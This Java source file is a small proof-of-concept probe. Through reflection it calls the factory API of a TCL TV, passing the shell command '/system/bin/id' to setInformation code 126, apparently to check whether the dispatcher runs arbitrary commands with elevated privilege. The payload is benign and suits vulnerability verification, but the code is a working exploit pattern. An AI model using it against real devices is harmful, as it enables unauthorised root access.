/** Fixed identity-only probe of the stock factory command dispatcher. */
public final class FactoryIdentityProbe {
    public static void main(String[] args) throws Exception {
        if (args.length != 0) {
            throw new IllegalArgumentException("This diagnostic accepts no arguments");
        }
        Class.forName("com.tcl.tosapi.atv.TvPlayerApi");
        Class<?> factory = Class.forName("com.tcl.tosapi.atv.TFactoryApi");
        Object instance = factory.getMethod("getInstance").invoke(null);
        Object result = factory.getMethod("setInformation", int.class, String.class)
            .invoke(instance, 126, "/system/bin/id > /data/local/tmp/tcl-root-probe.txt");
        System.out.println("setInformation126=" + result);
    }
}
